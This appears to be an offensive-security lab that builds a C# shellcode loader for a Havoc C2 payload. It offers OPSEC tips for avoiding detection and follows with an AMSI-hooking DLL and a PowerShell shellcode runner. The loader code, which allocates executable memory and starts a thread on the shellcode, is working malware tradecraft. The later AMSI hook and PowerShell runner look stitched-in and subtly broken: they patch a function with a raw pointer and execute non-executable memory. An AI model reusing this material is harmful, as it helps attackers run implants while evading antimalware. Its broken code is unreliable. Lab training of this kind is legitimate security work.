# Lab - Shellcode


> OPSEC HINT : Let's apply some basic best practices when we compile the following code
> 1. add and icon file to the dotnet app.
> 2. add metadata
> 3. compile with CSC

When compiling the dotnet code you can specify the .net version
```powershell

```

We'll need the .Net Developer Pack 4.8, let's see if it is installed:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version
```

CSC.exe is located in "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"


>HINT : Remember that AMSI will behave differently with .net assemblies than it would when using powershell scripts. In a powershell script amsi.?dll is automatically loaded into powershell, with dotnet assemblies AMSI will interact with the CLR on demand.

Let's generate a Havoc shellcode payload (on `KALI` using the Havoc GUI):

Switch to your windows and under `"C:\THEV\Labs\LocalLoader"` you'll find a csharp solution file - open that with Visual Studio 2022.

We'll now build our own custom (but very basic) shellcode loader in CSHARP (= dotnet assembly).

```csharp
using System;
using System.Runtime.InteropServices;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            // (1) insert our shellcode
            byte[] shellCode = new byte[] { /* insert shellcode here */ };

            // (2) allocate memory for shellcode
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // (3) inject shellcode into allocated memory
            Marshal.Copy(shellCode, 0, funcAddr, shellCode.Length);

            // (4) execute injected shellcode
            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

----

To monitor AMSI (Antimalware Scan Interface) calls and see what is being scanned, you would need to hook into the AMSI functions. This is a more advanced technique and typically involves using a debugger or writing a custom DLL to intercept AMSI calls. Below is an example of how you might achieve this using PowerShell and C# to create a custom DLL that hooks into AMSI functions.

First, create a C# DLL to hook AMSI functions:

```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiHook
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private static IntPtr amsiScanBufferPtr;
    private static AmsiScanBufferDelegate originalAmsiScanBuffer;

    private delegate int AmsiScanBufferDelegate(IntPtr amsiContext, IntPtr buffer, uint length, string contentName, IntPtr amsiSession, out int result);

    public static void HookAmsi()
    {
        IntPtr amsiDll = LoadLibrary("amsi.dll");
        if (amsiDll == IntPtr.Zero)
        {
            throw new Exception("Failed to load amsi.dll");
        }

        amsiScanBufferPtr = GetProcAddress(amsiDll, "AmsiScanBuffer");
        if (amsiScanBufferPtr == IntPtr.Zero)
        {
            throw new Exception("Failed to get AmsiScanBuffer address");
        }

        uint oldProtect;
        VirtualProtect(amsiScanBufferPtr, (UIntPtr)IntPtr.Size, 0x40, out oldProtect);

        originalAmsiScanBuffer = (AmsiScanBufferDelegate)Marshal.GetDelegateForFunctionPointer(amsiScanBufferPtr, typeof(AmsiScanBufferDelegate));
        Marshal.WriteIntPtr(amsiScanBufferPtr, Marshal.GetFunctionPointerForDelegate(new AmsiScanBufferDelegate(HookedAmsiScanBuffer)));

        VirtualProtect(amsiScanBufferPtr, (UIntPtr)IntPtr.Size, oldProtect, out oldProtect);
    }

    private static int HookedAmsiScanBuffer(IntPtr amsiContext, IntPtr buffer, uint length, string contentName, IntPtr amsiSession, out int result)
    {
        byte[] managedBuffer = new byte[length];
        Marshal.Copy(buffer, managedBuffer, 0, (int)length);
        Console.WriteLine("AMSI Scan Buffer: " + BitConverter.ToString(managedBuffer));

        return originalAmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession, out result);
    }
}
```

Next, compile the C# code into a DLL:

```sh
csc /target:library /out:C:\git\code\amsidll\AmsiHook.dll C:\git\code\amsidll\AmsiHook.cs
```

Then, create a PowerShell script to load the DLL and hook AMSI functions:

```powershell
Add-Type -Path "C:\git\code\amsidll\AmsiHook.dll"

# Hook AMSI functions
[AmsiHook]::HookAmsi()

# Your shellcode loader script
$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode

# Allocate memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
Write-Output "Allocated $($shellcode.Length) bytes of memory at address: $mem"

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
Write-Output "Copied shellcode to memory at address: $mem"

# Create thread to execute shellcode
$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])
Write-Output "Created thread to execute shellcode at address: $mem"

# Start the thread
$thread.Invoke()
Write-Output "Started thread to execute shellcode"

# Wait for thread to exit (optional)
[System.Threading.Thread]::Sleep(-1)
Write-Output "Thread is running, waiting for it to exit (optional)"
```

This script will hook into the AMSI functions and print the buffer being scanned by AMSI. Note that this is a simplified example and may require additional error handling and adjustments for a production environment.